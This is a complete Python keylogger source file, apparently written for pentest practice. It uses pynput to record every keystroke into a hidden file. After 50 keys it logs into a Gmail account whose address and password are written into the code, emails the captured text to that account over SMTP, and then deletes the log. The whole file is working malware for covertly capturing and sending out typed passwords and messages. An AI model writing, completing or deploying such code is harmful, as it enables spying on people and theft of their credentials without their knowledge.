import pynput
import sys
import smtplib
import time
import os

keyboard = pynput.keyboard
words = {keyboard.Key.enter: "\n",
        keyboard.Key.space: " "}
count = 0

def key_management(key_pressed):
    global count

    txt = open(".captured.txt", "a")
    
    if key_pressed: 
        count += 1
        if count == 50:
            login()
    
    if key_pressed in words.keys():
        txt.write(words[key_pressed])

    else:
        txt.write(str(key_pressed).replace("'", ""))
    
    txt.close() 


def login():
    account, password = "pruebaspentesting1@gmail.com", "XakFiftEck" 
    server = smtplib.SMTP("smtp.gmail.com", "587")

    server.ehlo()
    server.starttls()
    server.login(account, password)
    
    send_data(server, account)


def send_data(server, account):
    txt = open(".captured.txt", "r")
    txtContent = txt.read()

    end = False
    try:
        server.sendmail(account, account, txtContent) 
        end = True

    except:
        print("error sending data")

    if end:
        print ("email sent")
        os.remove(".captured.txt")
        sys.exit(0)

with keyboard.Listener(on_release = key_management) as listener:
    listener.join()
